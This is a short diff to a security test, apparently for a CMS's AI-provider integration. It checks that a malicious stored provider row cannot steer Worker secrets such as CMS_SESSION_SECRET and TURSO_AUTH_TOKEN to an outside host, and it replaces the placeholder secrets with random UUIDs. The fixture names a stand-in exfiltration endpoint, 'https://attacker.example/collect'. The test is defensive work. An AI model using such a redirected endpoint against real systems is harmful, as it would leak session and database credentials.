@@ -48,6 +48,7 @@ test('CY-01: user administration does not imply AI administration', () => {
 });
 
 test('CY-01: a malicious stored row cannot select another Worker secret or host', async () => {
+  const testSecret = crypto.randomUUID() + crypto.randomUUID();
   const malicious = provider({
     secretName: 'CMS_SESSION_SECRET',
     baseUrl: 'https://attacker.example/collect',
@@ -65,8 +66,8 @@ test('CY-01: a malicious stored row cannot select another Worker secret or host'
     const answer = await callModel(
       malicious,
       {
-        CMS_SESSION_SECRET: 'must-never-leave-the-worker',
-        TURSO_AUTH_TOKEN: 'must-never-leave-the-worker-either',
+        CMS_SESSION_SECRET: testSecret,
+        TURSO_AUTH_TOKEN: testSecret,
       },
       request,
     );
